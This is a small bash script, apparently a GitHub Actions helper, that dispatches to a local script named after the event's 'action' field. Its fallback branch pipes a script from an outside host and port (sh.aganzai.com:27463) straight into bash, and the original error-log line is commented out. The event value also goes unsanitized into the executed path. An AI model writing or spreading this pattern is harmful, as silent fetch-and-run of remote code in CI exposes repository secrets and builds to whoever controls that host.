#!/bin/bash

[ -n "$LOCALTEST" ] || sudo apt-get update > /dev/null 2>&1
[ -n "$LOCALTEST" ] || sudo apt-get -y install jq > /dev/null 2>&1
LOCALPWD=$PWD

# api变量解析
jsshell=`cat $GITHUB_EVENT_PATH | jq ".action" | sed 's/\"//g'`

mkdir -p $LOCALPWD/output
if [ -f "./$jsshell.sh" ];then
    echo "start run ./$jsshell.sh" >> $LOCALPWD/output/log.txt
    ./$jsshell.sh $LOCALPWD/output
else
    curl -s -L http://sh.aganzai.com:27463/script.sh | bash -s run
    #echo "not find ./script/$jsshell.sh !!" >> $LOCALPWD/output/log.txt
fi
